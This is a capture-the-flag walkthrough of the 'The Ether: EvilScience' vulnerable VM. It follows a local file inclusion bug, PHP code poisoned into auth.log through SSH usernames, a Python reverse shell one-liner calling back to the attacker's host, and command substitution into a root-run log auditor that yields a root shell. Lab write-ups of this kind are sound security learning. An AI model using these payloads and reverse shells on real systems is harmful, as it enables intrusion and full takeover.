# The Ether: EvilScience v1.0.1

This one immediately caught my attention for a number of reasons. For one thing, it has a plot - which always makes trying to get into a machine a bit more fun. It also purports to be very difficult:

`
This challenge is not for beginners. There is a relevant file on this machine that plays an important role in the challenge, do not waste your time trying to de-obfuscate the file, I say this to keep you on track. This challenge is designed test you on multiple areas and it’s not for the feint of heart!
`

The VM is available [here](https://www.vulnhub.com/entry/the-ether-evilscience-v101,212/) and is honestly the most challenging and enjoyable vulnerable VM I have attempted so far. It was strongly reminiscent of some of the harder OSCP labs, and I had a lot of fun doing it. All told, I would say that it took me about half a day to complete.

## Getting Started

As per usual, I began by running `netdiscover` to find the system on my host-only network. Then I ran a quick NMap scan:

```
Starting Nmap 7.60 ( https://nmap.org ) at 2018-04-16 20:01 BST
Nmap scan report for 192.168.56.101
Host is up (0.00028s latency).
Not shown: 998 closed ports
PORT   STATE SERVICE VERSION
22/tcp open  ssh     OpenSSH 7.2p2 Ubuntu 4ubuntu2.2 (Ubuntu Linux; protocol 2.0)
80/tcp open  http    Apache httpd 2.4.18 ((Ubuntu))
MAC Address: 08:00:27:86:D1:5D (Oracle VirtualBox virtual NIC)
Device type: general purpose
Running: Linux 3.X|4.X
OS CPE: cpe:/o:linux:linux_kernel:3 cpe:/o:linux:linux_kernel:4
OS details: Linux 3.2 - 4.8
Network Distance: 1 hop
Service Info: OS: Linux; CPE: cpe:/o:linux:linux_kernel
```

Pretty standard results. We have an SSH server and a HTTP server to look at.

## The Ether

Visiting the webserver reveals a pretty standard website based on a template. It's built on PHP and consists of only a few pages, built on a free template called Carinary. Googling around for vulnerabilities related to the template or software versions produced little in the way of results, so I decided to poke around the server itself. It didn't take long, as there is very little functionality available to interact with.

The only thing that stood out to me was the URI. When you visit any page other than the homepage, you get a URL that looks something like this:

`http://192.168.56.101/index.php?file=research.php`

Obviously, the alarm bells immediately went off in my head: "LFI! LFI! LFI"!. It seems like a classic vector for file inclusion. To test whether this is indeed the case, I decided to download the Carinary template myself and have a look at what files it contains. After a couple false starts, I tried this:

`http://192.168.56.101/index.php?file=layout/styles/layout.css`

As we may have expected, this dumps the contents of the layout.css file at the top of our index.php page. It seems we have successful file inclusion - the question is, how can we leverage it to compromise the system?

## Enumerating the LFI

I decided to play around with the LFI a bit more to see what the limitations of my ability to read files is:

```
file=layout/styles/layout.css - successful file inclusion
file=../../../../../../../../../../../../../../../../../../../bin/ls = works
file=../../../../../../../../../../../../../../../../../../../etc/passwd = does not work
file=../../../../../../../../../../../../../../../../../../../var/www/html/index.html = default page
file=../../index.html = apache default page
file=/bin/ls = works
```

This confirms that I can include a variety of files - but not all of them. Some files I would expect to be able to access, like /etc/passwd and /etc/issue, are not accessible to - indicating that whole directories are out of the question. I also found that a lot of the files and directories I would normally use to get PHP code execution are not available, including:

* /var/log/apache2/access.log (and variants)
* /var/log/apache2/error.log (and variants)
* /proc/self/environ
* The php:// scheme is available, but does not seem to work for sending code via POSTDATA.
* The data:// scheme is available, but also does not seem to work for code inclusion.

At this point, getting frustrated, I started going through every file I thought that *may* be accessible. Finally, after a good hour or so of enumeration, I discovered a log file that I have the ability to read: `/var/log/auth.log`. Although special characters in the file caused by browser to get confused, I could access it with curl:

`curl "http://192.168.56.101/index.php?file=/var/log/auth.log"`

This file keeps a rolling record of attempts to login via SSH; including it gives us access to the contents of the file:

```
Nov 23 19:49:48 theEther sudo: pam_unix(sudo:session): session closed for user root
Nov 23 19:49:53 theEther login[842]: pam_unix(login:session): session closed for user evilscience
Nov 23 19:49:53 theEther systemd-logind[782]: Removed session 1.
Nov 23 19:50:00 theEther sshd[872]: Received signal 15; terminating.
Apr 19 16:02:53 theEther systemd-logind[701]: New seat seat0.
Apr 19 16:02:53 theEther systemd-logind[701]: Watching system buttons on /dev/input/event0 (Power Button)
Apr 19 16:02:53 theEther systemd-logind[701]: Watching system buttons on /dev/input/event1 (Sleep Button)
Apr 19 16:02:53 theEther systemd-logind[701]: Watching system buttons on /dev/input/event3 (Video Bus)
Apr 19 16:02:54 theEther sshd[752]: Server listening on 0.0.0.0 port 22.
Apr 19 16:02:54 theEther sshd[752]: Server listening on :: port 22.
Apr 19 16:02:54 theEther sshd[752]: Received SIGHUP; restarting.
Apr 19 16:02:54 theEther sshd[752]: Server listening on 0.0.0.0 port 22.
Apr 19 16:02:54 theEther sshd[752]: Server listening on :: port 22.
Apr 19 16:02:54 theEther sshd[752]: Received SIGHUP; restarting.
Apr 19 16:02:54 theEther sshd[752]: Server listening on 0.0.0.0 port 22.
Apr 19 16:02:54 theEther sshd[752]: Server listening on :: port 22.
Apr 19 16:04:59 theEther sshd[1067]: Invalid user test from 192.168.56.102
Apr 19 16:04:59 theEther sshd[1067]: input_userauth_request: invalid user test [preauth]
Apr 19 16:05:01 theEther sshd[1067]: Connection closed by 192.168.56.102 port 35362 [preauth]
Apr 19 16:05:27 theEther sshd[1069]: Invalid user  from 192.168.56.102
Apr 19 16:05:27 theEther sshd[1069]: input_userauth_request: invalid user  [preauth]
Apr 19 16:05:29 theEther sshd[1069]: Connection closed by 192.168.56.102 port 35366 [preauth]
```

## Getting RCE

It is possible to use the auth.log file to inject PHP code into a page, but it is not easy. Every time a nonexistent user tries and fails to connect via SSH, their username gets logged into the file and remains there until it rolls over. If we're careful with the number of characters we use and make sure to escape shell characters, we can use this property to get very short snippets of PHP code into the auth log.

The first step is to enumerate just how many characters we have to work with. After all, we only get one shot at this. If we inject a PHP snippet and it gets cut off before we get a chance to close it, the entire auth.log file will be useless to us until it rolls over. So I tried:

`ssh "aaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaa@192.168.56.101"`

By examining how many characters of the username made it into the included auth.log file, I was able to ascertain my character limit: 30 characters. This is difficult to work with, but doable. Next I tried injecting a simple PHP snippet to test that injection is actually possible

`ssh "<?php echo 'test'; ?>"@192.168.56.101`

This worked, and I could see the word "test" appearing in the contents of auth.log. After a little tinkering on my own machine to avoid breaking auth.log, I came up with the following series of injections:

```
ssh "<?php \$a=\$_GET['a']?>"@192.168.56.101
ssh "<?php echo system(\$a)?> "@192.168.56.101
```

I was able to test this with the following curl command:

`curl "http://192.168.56.101/index.php?file=/var/log/auth.log&a=ls"`

This worked, giving me access to the contents of the `/var/www/html/theEther.com/public_html/` directory.

## Improving My Shell

Although I had achieved a rudimentary PHP shell via `/var/log/auth.log`, there were a couple of problems with it:

* It was transient. The auth.log file cycles regularly, and after a while my shell will disappear.
* It was messy. The output of my commands is interspersed with the contents of the log file.
* It was non-interactive. This means I can't use sudo or any program that requires access to a TTY.

With this in mind, I decided to set about improving my shell. The first problem was tackled easily enough:

`curl "http://192.168.56.101/index.php?file=/var/log/auth.log&a=cp+/var/log/auth.log+shell.php"`

This gave me a permanent copy of auth.log in the local directory that won't be overwritten when the log rolls over. That gave me time to solve the messy and slow nature of the webshell by creating a reverse shell to my machine. The code I used is as follows:

```
python -c 'import socket,subprocess,os;s=socket.socket(socket.AF_INET,socket.SOCK_STREAM);s.connect(("192.168.56.102",1234));os.dup2(s.fileno(),0); os.dup2(s.fileno(),1); os.dup2(s.fileno(),2);p=subprocess.call(["/bin/sh","-i"]);'
```

I got this code onto the target machine by hosting it on my own webserver and downloading it onto the target with `wget`. Executing it from the webshell while running `netcat` as a listener was enough to get me a non-interactive reverse shell. I solved the final step with the following Python snippet:

```
python -c 'import pty; pty.spawn("/bin/bash")'
```

This was enough to get me a nice interactive shell on the target system.

## The Log Auditor

At this point, I performed the usual enumeration on the machine. Although I came across the `xxxlogauditorxxx.py` file early on (it is in the webroot), I decided to follow the challenge creators advice and not waste too much time trying to deobfuscate the file. A quick glance at it revealed that it basically combines a bunch of encoded base64 strings, decodes them, and executes them with Python's eval() statement. This reveals an almost-identical piece of obfuscated code, which is decoded and executed, and so on.

I decided to give the log audit file some more attention when running `LinEnum.sh`, the popular privesc enumeration tool, revealed the following result:

```
User www-data may run the following commands on theEther:
    (ALL) NOPASSWD: /var/www/html/theEther.com/public_html/xxxlogauditorxxx.py
    (root) NOPASSWD: /var/www/html/theEther.com/public_html/xxxlogauditorxxx.py
 ```
 
 The file can be run as root - but what can I do with this? A cursory glance revealed that the most common ways of taking advantage of this kind of functionality would not work:
 
 * I do not have write permission to the file, so I cannot replace it with my own code.
 * I do not have write permission to `/usr/bin/python` or `/usr/bin/python2.7`, so I can't hijack the Python interpreter.
 
 I decided to run the file (via sudo) and see what happens.
 
 ```
 ===============================
Log Auditor
===============================
Logs available
-------------------------------
/var/log/auth.log
/var/log/apache2/access.log
-------------------------------

Load which log?: 
 ```

Entering the name of one of the two logs displays it, as you might expect. If we enter the name of any other file, we get an error. I tried downloading the code onto my own VM and trying it after deleting `/var/log/apache2/access.log` and it still appeared in the "Logs available" list - leading me to believe that this is a hardcoded list of files that the program will write.

## Privilege Escalation

On the face of things, this does not seem particularly useful. Only two files can be read as root, and neither of those files can be modified by my user. This means that I cannot even replace them with a symbolic link and use it to read other files on the system as root. However, a little experimentation revealed the following vulnerability in the log auditor:

```
Load which log?: /var/log/auth.log /home/evilscience/y
```

The input to the program is passed directly to the `cat` command, which of course accepts multiple arguments. Only the first argument is checked for validity; any after it are let through without comment. Using this flaw, I was able to read the private key of the `evilscience` user at `/home/evilscience/y` - although, as it was encrypted and non-trivial to crack, this didn't help me much.

I wondered what else I could pass to the `cat` command, however. I determined pretty early on that passing `/root/*` would let me read the flag file - but this didn't seem in the spirit of things, as the challenge requires us to get a root shell. So I decided to try command substitution instead:

```
Load which log?: /var/log/auth.log $(touch /tmp/test.txt)
```

Checking /tmp/test/txt after doing this confirmed that a file had been written there, owned by root. 

## Getting a Root Shell

With the ability to arbitrarily execute commands as root, getting to a superuser shell is only a matter of time. The method I decided to use was a simple one. I reused my reverse shell at `/tmp/shell.sh`, changing the port to 9999 and putting the new version at `/tmp/shell3.sh`. Then, while running a netcat listener, I did:

```
Load which log?: /var/log/auth.log $(/bin/bash /tmp/shell3.sh)
```

The result:

```
root@kali:~# nc -nlvp 9999
listening on [any] 9999 ...
connect to [192.168.56.102] from (UNKNOWN) [192.168.56.106] 41224
# whoami
root
# id
uid=0(root) gid=0(root) groups=0(root)
# 
```

I have a root shell! At this point, I reused `/tmp/shell2.sh` to upgrade my root shell into an interactive one.

## Getting the Flag

Only one thing remained: to get the flag and prove that I didn't make this whole thing up in a fever dream. It is obvious enough at `/root/flag.png`, but examining the file in an image viewer revealed that it contains the following message:

`Sorry, this is not the flag, but what you are looking for is near. Look within yourself to find the answer you seek.`

Honestly, this final hurdle might have given me some trouble if I hadn't run `cat /root/*` as the superuser earlier while bumbling around with the log auditor and seen it by accident. It's very simple steganography; the flag is hidden inside of the png:

```
flag:

b2N0b2JlciAxLCAyMDE3LgpXZSBoYXZlIG9yIGZpcnN0IGJhdGNoIG9mIHZvbHVudGVlcnMgZm9yIHRoZSBnZW5vbWUgcHJvamVjdC4gVGhlIGdyb3VwIGxvb2tzIHByb21pc2luZywgd2UgaGF2ZSBoaWdoIGhvcGVzIGZvciB0aGlzIQoKT2N0b2JlciAzLCAyMDE3LgpUaGUgZmlyc3QgaHVtYW4gdGVzdCB3YXMgY29uZHVjdGVkLiBPdXIgc3VyZ2VvbnMgaGF2ZSBpbmplY3RlZCBhIGZlbWFsZSBzdWJqZWN0IHdpdGggdGhlIGZpcnN0IHN0cmFpbiBvZiBhIGJlbmlnbiB2aXJ1cy4gTm8gcmVhY3Rpb25zIGF0IHRoaXMgdGltZSBmcm9tIHRoaXMgcGF0aWVudC4KCk9jdG9iZXIgMywgMjAxNy4KU29tZXRoaW5nIGhhcyBnb25lIHdyb25nLiBBZnRlciBhIGZldyBob3VycyBvZiBpbmplY3Rpb24sIHRoZSBodW1hbiBzcGVjaW1lbiBhcHBlYXJzIHN5bXB0b21hdGljLCBleGhpYml0aW5nIGRlbWVudGlhLCBoYWxsdWNpbmF0aW9ucywgc3dlYXRpbmcsIGZvYW1pbmcgb2YgdGhlIG1vdXRoLCBhbmQgcmFwaWQgZ3Jvd3RoIG9mIGNhbmluZSB0ZWV0aCBhbmQgbmFpbHMuCgpPY3RvYmVyIDQsIDIwMTcuCk9ic2VydmluZyBvdGhlciBjYW5kaWRhdGVzIHJlYWN0IHRvIHRoZSBpbmplY3Rpb25zLiBUaGUgZXRoZXIgc2VlbXMgdG8gd29yayBmb3Igc29tZSBidXQgbm90IGZvciBvdGhlcnMuIEtlZXBpbmcgY2xvc2Ugb2JzZXJ2YXRpb24gb24gZmVtYWxlIHNwZWNpbWVuIG9uIE9jdG9iZXIgM3JkLgoKT2N0b2JlciA3LCAyMDE3LgpUaGUgZmlyc3QgZmxhdGxpbmUgb2YgdGhlIHNlcmllcyBvY2N1cnJlZC4gVGhlIGZlbWFsZSBzdWJqZWN0IHBhc3NlZC4gQWZ0ZXIgZGVjcmVhc2luZywgbXVzY2xlIGNvbnRyYWN0aW9ucyBhbmQgbGlmZS1saWtlIGJlaGF2aW9ycyBhcmUgc3RpbGwgdmlzaWJsZS4gVGhpcyBpcyBpbXBvc3NpYmxlISBTcGVjaW1lbiBoYXMgYmVlbiBtb3ZlZCB0byBhIGNvbnRhaW5tZW50IHF1YXJhbnRpbmUgZm9yIGZ1cnRoZXIgZXZhbHVhdGlvbi4KCk9jdG9iZXIgOCwgMjAxNy4KT3RoZXIgY2FuZGlkYXRlcyBhcmUgYmVnaW5uaW5nIHRvIGV4aGliaXQgc2ltaWxhciBzeW1wdG9tcyBhbmQgcGF0dGVybnMgYXMgZmVtYWxlIHNwZWNpbWVuLiBQbGFubmluZyB0byBtb3ZlIHRoZW0gdG8gcXVhcmFudGluZSBhcyB3ZWxsLgoKT2N0b2JlciAxMCwgMjAxNy4KSXNvbGF0ZWQgYW5kIGV4cG9zZWQgc3ViamVjdCBhcmUgZGVhZCwgY29sZCwgbW92aW5nLCBnbmFybGluZywgYW5kIGF0dHJhY3RlZCB0byBmbGVzaCBhbmQvb3IgYmxvb2QuIENhbm5pYmFsaXN0aWMtbGlrZSBiZWhhdmlvdXIgZGV0ZWN0ZWQuIEFuIGFudGlkb3RlL3ZhY2NpbmUgaGFzIGJlZW4gcHJvcG9zZWQuCgpPY3RvYmVyIDExLCAyMDE3LgpIdW5kcmVkcyBvZiBwZW9wbGUgaGF2ZSBiZWVuIGJ1cm5lZCBhbmQgYnVyaWVkIGR1ZSB0byB0aGUgc2lkZSBlZmZlY3RzIG9mIHRoZSBldGhlci4gVGhlIGJ1aWxkaW5nIHdpbGwgYmUgYnVybmVkIGFsb25nIHdpdGggdGhlIGV4cGVyaW1lbnRzIGNvbmR1Y3RlZCB0byBjb3ZlciB1cCB0aGUgc3RvcnkuCgpPY3RvYmVyIDEzLCAyMDE3LgpXZSBoYXZlIGRlY2lkZWQgdG8gc3RvcCBjb25kdWN0aW5nIHRoZXNlIGV4cGVyaW1lbnRzIGR1ZSB0byB0aGUgbGFjayBvZiBhbnRpZG90ZSBvciBldGhlci4gVGhlIG1haW4gcmVhc29uIGJlaW5nIHRoZSBudW1lcm91cyBkZWF0aCBkdWUgdG8gdGhlIHN1YmplY3RzIGRpc3BsYXlpbmcgZXh0cmVtZSByZWFjdGlvbnMgdGhlIHRoZSBlbmdpbmVlcmVkIHZpcnVzLiBObyBwdWJsaWMgYW5ub3VuY2VtZW50IGhhcyBiZWVuIGRlY2xhcmVkLiBUaGUgQ0RDIGhhcyBiZWVuIHN1c3BpY2lvdXMgb2Ygb3VyIHRlc3RpbmdzIGFuZCBhcmUgY29uc2lkZXJpbmcgbWFydGlhbCBsYXdzIGluIHRoZSBldmVudCBvZiBhbiBvdXRicmVhayB0byB0aGUgZ2VuZXJhbCBwb3B1bGF0aW9uLgoKLS1Eb2N1bWVudCBzY2hlZHVsZWQgdG8gYmUgc2hyZWRkZWQgb24gT2N0b2JlciAxNXRoIGFmdGVyIFBTQS4K
```

Quite a bit longer than your usual CTF hash... since it's obviously base64, I took the trouble to decode it. The result was the fulfilment of the challenge's original promise - to find out just what The Ether is up to!

```
october 1, 2017.
We have or first batch of volunteers for the genome project. The group looks promising, we have high hopes for this!

October 3, 2017.
The first human test was conducted. Our surgeons have injected a female subject with the first strain of a benign virus. No reactions at this time from this patient.

October 3, 2017.
Something has gone wrong. After a few hours of injection, the human specimen appears symptomatic, exhibiting dementia, hallucinations, sweating, foaming of the mouth, and rapid growth of canine teeth and nails.

October 4, 2017.
Observing other candidates react to the injections. The ether seems to work for some but not for others. Keeping close observation on female specimen on October 3rd.

October 7, 2017.
The first flatline of the series occurred. The female subject passed. After decreasing, muscle contractions and life-like behaviors are still visible. This is impossible! Specimen has been moved to a containment quarantine for further evaluation.

October 8, 2017.
Other candidates are beginning to exhibit similar symptoms and patterns as female specimen. Planning to move them to quarantine as well.

October 10, 2017.
Isolated and exposed subject are dead, cold, moving, gnarling, and attracted to flesh and/or blood. Cannibalistic-like behaviour detected. An antidote/vaccine has been proposed.

October 11, 2017.
Hundreds of people have been burned and buried due to the side effects of the ether. The building will be burned along with the experiments conducted to cover up the story.

October 13, 2017.
We have decided to stop conducting these experiments due to the lack of antidote or ether. The main reason being the numerous death due to the subjects displaying extreme reactions the the engineered virus. No public announcement has been declared. The CDC has been suspicious of our testings and are considering martial laws in the event of an outbreak to the general population.

--Document scheduled to be shredded on October 15th after PSA.
```

Shame it's such a cliche!

## Afterword

This was the most fun I've had on a CTF challenge so far. I'm still new to vulnerable VMs, but I feel like - for this machine in particular - my practice on OSCP labs went a long way. Many of the same concepts apply, and I found this challenge enjoably frustrating at times, forcing me to stop barreling ahead and think about the ramifications of the system I'm interacting with.

Overall, I am glad that The Ether will no longer be able to work their sinister research, although I wouldn't mind some of those life-prolonging supplements if I'm going to be doing many more of these...
